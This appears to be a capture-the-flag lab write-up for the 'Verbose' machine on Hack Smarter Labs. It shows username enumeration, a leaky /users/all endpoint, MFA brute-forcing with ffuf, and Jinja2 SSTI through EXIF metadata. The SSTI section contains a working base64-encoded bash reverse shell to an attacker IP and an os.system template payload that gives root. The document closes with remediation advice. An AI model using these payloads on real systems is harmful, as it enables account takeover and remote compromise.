`[BROKEN ACCESS CONTROL]` `[USERNAME ENUMERATION]` `[MFA BYPASS]` `[SSTI]` `[RCE]`

# Verbose

![](<../.gitbook/assets/verbose_cover.png>)

---

**Platform:** Hack Smarter Labs   
**Operating System:** Ubuntu Linux   
**Topics:** Username Enumeration, Broken Access Control, Cleartext Credentials, MFA Brute-Force, SSTI (Jinja2), RCE

---

## Scenario

### Objective / Scope

Verbose simulates an external penetration test against a web application with open user registration. The objective is to map the application's attack surface, exploit layered misconfigurations in access control and authentication, and achieve full root-level compromise of the underlying host.

---

<details>
<summary>Summary</summary>

We begin by discovering two services — SSH with public-key-only authentication and a Werkzeug/Python web application on port 80. Dirsearch surfaces `/login` and `/register`; registering a test account reveals existing usernames in the application's inbox, and verbose error messages on `/login` confirm them independently. Authenticated as our test user, we review the Burp Site Map and discover the admin-only `/users/all` API endpoint accessible to any authenticated session — a Broken Access Control flaw that returns cleartext credentials for every account. We authenticate as `admin` but hit a 4-digit MFA gate with no rate limiting; `ffuf` brute-forces the `code=` parameter with a 0000–9999 wordlist, filters for the unique `302` redirect, and recovers the valid code. Inside the admin panel the first flag is waiting. We then discover a logo upload feature that extracts and renders image EXIF metadata — injecting `{{7*7}}` into the `Artist` field via `exiftool` reflects `49`, confirming unsandboxed Jinja2 SSTI. We escalate to RCE by embedding a base64-encoded reverse shell in the same field, re-uploading, and triggering "Preview Current Logo", catching a shell directly as `root`.

</details>

---

## Recon

### Nmap

```bash
nmap -sC -sV -Pn verbose.hsm
```

```
# Console Output
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d8:2b:0a:0d:0d:a2:03:5d:e9:7a:fb:27:c0:6b:49:14 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJbq01TOZL35QBp8sbK3ibsxGfCkAwJJpqABIopBG6aIbilARAMglzfAIVwSs/k61ovqYr3TbW6TntqxW84WKjM=
|   256 48:0f:ea:02:a5:5f:19:1a:35:85:01:e7:98:b5:8a:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH7WAd+U5s2NFnLKAnfOCEUypSkOp+LJtXZpMhjjPLHS

80/tcp open  http    syn-ack ttl 62 Werkzeug httpd 3.1.5 (Python 3.12.3)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
| http-title: Hack Smarter Portal
|_Requested resource was /login
|_http-server-header: Werkzeug/3.1.5 Python/3.12.3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two services: SSH on 22 and a Python/Werkzeug application on port 80. The `http-title` confirms "Hack Smarter Portal" and Nmap follows the redirect to `/login`. The `Werkzeug/3.1.5 Python/3.12.3` server header is immediately significant: Werkzeug is the WSGI library underlying Flask, and Flask's default templating engine is **Jinja2** — a detail worth holding onto. SSH responds with `Permission denied (publickey)`, confirming no password auth surface exists.

### Directory Enumeration

```bash
dirsearch -u http://verbose.hsm
```

```
# Console Output
[08:11:29] 200 -    3KB - /login
[08:11:58] 200 -    3KB - /register
```

Only two public endpoints. Open registration is noteworthy — it grants unauthenticated access to the application context and authenticated session privileges once a test account is created.

---

## Foothold

### Username Enumeration

The `/login` endpoint issues distinct error messages depending on whether a submitted username exists in the database. This classic information disclosure allows us to enumerate valid accounts without any credentials.

![Login page — username enumeration via revealing error messages](<../.gitbook/assets/verbose_login_username_enum.png>)

Registering a test account (`Hacker1`) and reviewing the application inbox reveals four pre-existing users:

![Application inbox — valid usernames discovered after registration](<../.gitbook/assets/verbose_register_inbox_users.png>)

```
# Console Output
# 4 users listed
tony
johnny
admin
student
```

### Broken Access Control — `/users/all`

After authenticating as `Hacker1`, we proxy traffic through Caido and inspect the Site Map. An API endpoint, `/users/all`, appears — it is called by the admin interface but is absent from the standard user UI.

![Caido Site Map — /users/all API endpoint discovered](<../.gitbook/assets/verbose_burp_sitemap_users_all.png>)

The developer assumed that hiding the admin panel link from low-privileged users was sufficient protection. This is **security through obscurity** — the endpoint performs no server-side authorisation check on the caller's role. Any authenticated session, including our `Hacker1` account, can reach it directly.

Querying `/users/all` returns plaintext credentials for every account in the application:

![/users/all response — cleartext credentials for all accounts](<../.gitbook/assets/verbose_api_users_all_creds.png>)

```
# Console Output
admin:<PASSWORD REDACTED>
tony:<PASSWORD REDACTED>
student:<PASSWORD REDACTED>
johnny:<PASSWORD REDACTED>
```

### MFA Brute-Force — Bypassing the Admin Gate

Submitting `admin`'s credentials hits a second factor: a 4-digit numeric OTP delivered to a registered device.

![Admin login — 4-digit MFA prompt](<../.gitbook/assets/verbose_admin_mfa_prompt.png>)

The keyspace is exactly 10,000 combinations (0000–9999) and the endpoint imposes no rate limiting or lockout policy. We capture the MFA submission request in Caido to identify the `code=` parameter and extract the session cookie:

![Caido — captured MFA submission request](<../.gitbook/assets/verbose_burp_admin_login_capture.png>)

We generate a zero-padded numeric wordlist, then use Caido's intruder to spray the `code=` parameter sequentially from `0000` to `9999`:

```bash
seq -w 0000 9999 > numlist.txt
```

![Caido — MFA spray configured with numlist](<../.gitbook/assets/verbose_ffuf_mfa_bruteforce.png>)

Filtering responses by status code, a single `302 Found` redirect stands out — code `6196` — while all 9,999 other attempts return `200`.

![Caido — 302 redirect isolates code 6196](<../.gitbook/assets/verbose_ffuf_mfa_302_found.png>)

> 💡 **Author's Note:** The MFA code `6196` is instance-specific — it will differ on each machine reset. The attack methodology (spray 0000–9999, filter for `302`) remains constant regardless of the target value.

**Alternative — ffuf:** If a proxy intruder is unavailable, the same attack runs directly from the terminal. Pass `-t 3` to avoid overwhelming the server, and `-fc 200,500` to filter noise:

```bash
ffuf -X POST -w numlist.txt -u http://verbose.hsm/mfa \
  -d 'code=FUZZ' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=eyJtZmFfdXNlciI6ImFkbWluIiwic2Vzc2lvbl9pZCI6IjdkNzQ5M2U3LTI0OWEtNDVjZS05MGU3LTk4MGM1MzQzYWQ4ZSJ9.ajMEQw.KKH9JyZvGejQ6vmp23uRcFeifvk' \
  -fc 200,500 -t 3
```

```
# Console Output
6196                    [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 107ms]
```

Submitting the code authenticates us as `admin`:

![MFA code submission — authenticated as admin](<../.gitbook/assets/verbose_mfa_code_submit.png>)

![Admin panel — authenticated](<../.gitbook/assets/verbose_admin_panel.png>)

The admin panel yields the first flag:

![Admin panel — first flag](<../.gitbook/assets/verbose_admin_flag1.png>)

```
# Console Output
<FLAG REDACTED>
```

---

## Privilege Escalation

### SSTI via Image Metadata — RCE as Root

The admin panel exposes a logo upload feature that extracts and renders image EXIF metadata for preview. The application passes user-controlled metadata fields directly into a Jinja2 template context without sanitisation — an SSTI vector.

![Admin panel — logo upload with metadata preview](<../.gitbook/assets/verbose_logo_metadata_upload.png>)

We confirm the engine by injecting a basic Jinja2 arithmetic probe into the `Artist` EXIF field using `exiftool`:

```bash
exiftool -Artist="{{7*7}}" mini-tyler.png
```

```
# Console Output
    1 image files updated
```

Re-uploading the modified image and clicking "Preview Current Logo" reflects `49` — confirming unsandboxed **Jinja2 SSTI**. The expression was evaluated server-side, not escaped.

![SSTI confirmed — {{7*7}} evaluated to 49](<../.gitbook/assets/verbose_ssti_7x7_confirmed.png>)

With the engine and execution confirmed, we escalate to OS command execution. To avoid shell metacharacter issues embedded within the EXIF string, we base64-encode the reverse shell payload separately:

```bash
echo 'bash -i >& /dev/tcp/10.200.65.67/1337 0>&1' | base64
```

```
# Console Output
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMDAuNjUuNjcvMTMzNyAwPiYxCg==
```

Start the listener:

```bash
nc -lvnp 1337
```

Inject the full Jinja2 RCE payload using `os.system` with an inline base64 decode-and-execute chain:

```bash
exiftool -Artist="{{self.__init__.__globals__.__builtins__.__import__('os').system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMDAuNjUuNjcvMTMzNyAwPiYxCg== | base64 -d | bash')}}" mini-tyler.png
```

```
# Console Output
    1 image files updated
```

Re-upload the image and click "Preview Current Logo". The template engine evaluates the payload, `os.system` executes the decoded bash command, and the reverse shell connects:

```
# Console Output
root@ip-10-1-32-50:/home/ubuntu# whoami
root
```

![Root shell — full RCE via Jinja2 SSTI](<../.gitbook/assets/verbose_root_shell.png>)

The application process runs as `root`. The root flag is at `/root/root.txt`:

```
# Console Output
<FLAG REDACTED>
```

---

## Remediation

- **Username enumeration:** Return a single generic message for all authentication failures — "Invalid credentials" — regardless of whether the username exists. Apply uniform response timing to prevent timing-channel enumeration.
- **Broken Access Control on `/users/all`:** Enforce server-side role checks on every API endpoint. Client-side hiding of navigation elements is not an access control mechanism. Middleware-level authorisation (e.g., a role decorator on every admin route) must gate these endpoints.
- **Cleartext credential storage and exposure:** Passwords must be stored as salted hashes (bcrypt, Argon2id). The API must never return plaintext passwords in any response; omit the field entirely or replace with a non-reversible representation.
- **MFA rate limiting:** Implement exponential backoff and a hard lockout after a small number of failed MFA attempts (e.g., 5). The 4-digit OTP keyspace of 10,000 is exhausted in under two minutes with a single low-thread attacker — rate limiting is the only control preventing this.
- **SSTI via image metadata:** Never pass user-controlled content, including file metadata, directly into a template rendering context. Strip or sanitise all EXIF fields before display. If template-driven rendering is required, use Jinja2's `SandboxedEnvironment` and validate that object traversal to `__globals__` or `__builtins__` is blocked.
